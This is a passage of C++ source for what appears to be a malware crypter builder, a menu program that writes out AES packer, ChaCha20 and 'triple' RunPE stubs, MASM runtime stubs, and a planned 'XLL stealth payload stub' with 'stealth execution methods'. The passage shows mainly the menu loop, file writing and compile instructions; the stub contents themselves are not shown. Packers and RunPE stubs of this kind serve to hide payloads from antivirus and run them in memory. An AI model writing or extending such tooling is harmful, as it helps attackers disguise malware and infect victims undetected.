        std::cout << "Encryption failed!" << std::endl;
        return 1;
    }
}
)";
        
        // Write stub to file
        std::ofstream stubFile(outputFile);
        if (!stubFile) {
            std::cout << "Error: Cannot create encryptor stub file!" << std::endl;
            return false;
        }
        
        stubFile << stub;
        stubFile.close();
        
        std::cout << "Encryptor stub generated successfully!" << std::endl;
        std::cout << "Output: " << outputFile << std::endl;
        std::cout << "Compile with: g++ -std=c++17 -O2 -o encryptor.exe " << outputFile << std::endl;
        std::cout << "Usage: ./encryptor.exe file.xll encrypted_file.bin" << std::endl;
        
        return true;
    }

    bool generateXLLStealthStub() {
        std::string inputFile, outputFile;
        
        std::cout << "Enter XLL payload file path: ";
        std::getline(std::cin, inputFile);
        std::cout << "Enter output C++ XLL stub path: ";
        std::getline(std::cin, outputFile);
        
        std::cout << "XLL stealth payload stub generation - Coming Soon!" << std::endl;
        std::cout << "This will create XLL-specific payload stubs with:" << std::endl;
        std::cout << "- XLL loading capabilities" << std::endl;
        std::cout << "- Excel integration functions" << std::endl;
        std::cout << "- Stealth execution methods" << std::endl;
        
        return true;
    }

    void run() {
        int choice;
        
        do {
            showMenu();
            std::cin >> choice;
            std::cin.ignore(); // Clear input buffer
            
            std::cout << std::endl;
            
            switch (choice) {
                case 1:
                    generateAESPacker();
                    break;
                case 2:
                    generateChaCha20RuntimePEStub();  // Will update this next
                    break;
                case 3:
                    generateTripleRuntimePEStub();    // Will update this next
                    break;
                case 4:
                    basicEncryption(false);
                    break;
                case 5:
                    generateMASMRuntimeStub();
                    break;
                case 0:
                    std::cout << "Goodbye!" << std::endl;
                    break;
                default:
                    std::cout << "Invalid choice! Please try again." << std::endl;
            }
            
            if (choice != 0) {
                std::cout << "\nPress Enter to continue...";
                std::cin.get();
            }
            
        } while (choice != 0);
    }
};

int main() {
    VS2022MenuEncryptor encryptor;
    encryptor.run();
    return 0;
}